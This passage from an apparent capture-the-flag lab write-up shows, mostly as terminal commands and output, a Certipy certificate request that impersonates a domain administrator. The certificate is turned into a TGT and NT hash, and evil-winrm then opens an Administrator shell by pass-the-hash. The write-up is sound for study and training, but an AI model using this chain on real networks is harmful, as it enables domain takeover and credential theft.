[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '127.0.0.1'
[+] DC IP: '127.0.0.1'
[+] DC Host: None
[+] Target IP: None
[+] Remote Name: 'AWSJPDC0522.shibuya.vl'
[+] Domain: ''
[+] Username: 'NIGEL.MILLS'
[+] Trying to resolve 'AWSJPDC0522.shibuya.vl' at '127.0.0.1'
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/certipy/lib/target.py", line 442, in resolve
    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1320, in resolve
    timeout = self._compute_timeout(start, lifetime, resolution.errors)
  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1076, in _compute_timeout
    raise LifetimeTimeout(timeout=duration, errors=errors)
dns.resolver.LifetimeTimeout: The resolution lifetime expired after 5.404 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:445  ...  OK
[+] Connected to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN '_admin@shibuya.vl'
[+] Found SID in SAN URL: 'S-1-5-21-87560095-894484815-3652015022-500'
[+] Found SID in security extension: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saving certificate and private key to '_admin.pfx'
[+] Attempting to write data to '_admin.pfx'
[+] Data written to '_admin.pfx'
[*] Wrote certificate and private key to '_admin.pfx'
```
Ive saved the .pfx

```python
proxychains certipy-ad auth -pfx _admin.pfx -dc-ip 127.0.0.1 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: '_admin@shibuya.vl'
[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Using principal: '_admin@shibuya.vl'
[*] Trying to get TGT...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[*] Got TGT
[*] Saving credential cache to '_admin.ccache'
[*] Wrote credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```
Now i can try and login as the administrator

```python
proxychains evil-winrm -i AWSJPDC0522.shibuya.vl -u _admin -H 'bab5b2a004eabb11d865f31912b6b430'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/16/2025   2:34 AM           2304 Microsoft Edge.lnk
-a----          4/8/2025   5:05 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
||5b150cc71e974d37624299cdd83798f1||
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:5985  ...  OK

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
Full domain compromise!
